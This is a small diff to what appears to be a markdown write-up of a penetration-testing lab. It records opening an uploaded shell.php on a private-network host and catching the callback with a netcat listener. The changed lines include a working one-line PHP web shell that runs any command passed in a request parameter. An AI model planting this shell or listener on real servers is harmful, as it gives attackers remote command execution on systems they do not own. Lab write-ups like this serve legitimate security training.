@@ -63,7 +63,8 @@
   Opened http://10.150.150.11/upload/2/shell.php and checked the nc -lvnp 1234 result to ensure it was listening and received the connection.
   
 
-<br>
+<br>     
+         
          <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
 
 <img width="531" height="140" alt="image" src="https://github.com/user-attachments/assets/a070af92-a0f7-4933-bf2a-0f34b596ffd6" />
